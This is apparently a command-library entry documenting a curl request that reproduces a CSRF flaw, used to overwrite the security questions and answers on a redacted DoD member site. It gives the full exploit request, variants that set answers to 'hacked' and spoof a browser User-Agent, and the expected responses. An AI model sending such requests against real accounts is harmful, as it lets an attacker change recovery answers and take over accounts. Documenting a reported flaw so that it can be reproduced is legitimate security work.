---
id: c1d2e3f4-g5h6-7891-cdef-012345678901
data: >-
  curl -X POST https://www.███████/member/updatesecurityquestions -H "Cookie:
  {YOUR-COOKIE}" -H "Content-Type: application/x-www-form-urlencoded" -H
  "Referer: https://www.██████/member/updatesecurityquestions" -d
  "security_questions1=1&security_question_answer1=temp&security_questions2=2&security_question_answer2=temp&security_questions3=3&security_question_answer3=temp&submit=Save"
tags:
  - web
  - csrf
  - post
type: command
output: HTTP/1.1 200 OK or 302 Redirect
executor: curl
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.296Z'
verified: false
validated: true
submitted: true
---
# curl-update-security-questions

## Command

```bash
curl -X POST https://www.███████/member/updatesecurityquestions \
  -H "Cookie: {YOUR-COOKIE}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: https://www.██████/member/updatesecurityquestions" \
  -d "security_questions1=1&security_question_answer1=temp&security_questions2=2&security_question_answer2=temp&security_questions3=3&security_question_answer3=temp&submit=Save"
```

## Description

This curl command simulates the HTTP POST request to update security questions and answers on the target DoD web application, useful for testing or reproducing the vulnerable request without CSRF token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Cookie: {YOUR-COOKIE}"` | Authentication session cookie | Yes |
| `-H "Content-Type: ..."` | Form data type | Yes |
| `-H "Referer: ..."` | Origin header for realism | No |
| `-d "..."` | Form parameters: question IDs and answers | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.███████/member/updatesecurityquestions -H "Cookie: session=abc123" -d "security_questions1=1&security_question_answer1=temp&submit=Save"
```

### Advanced Usage

```bash
curl -X POST https://www.███████/member/updatesecurityquestions -H "Cookie: {YOUR-COOKIE}" -H "User-Agent: Mozilla/5.0 ..." -d "security_questions1=1&security_question_answer1=hacked&security_questions2=2&security_question_answer2=hacked&security_questions3=3&security_question_answer3=hacked&submit=Save" -v
```

## Expected Output

Successful response: HTTP 200 OK with HTML confirming update, or 302 redirect to profile page. Failure: 403 if unauthenticated or post-fix with CSRF token required.

## Related

- [[Related Procedure: Intercept-Security-Questions-Update-Request]]
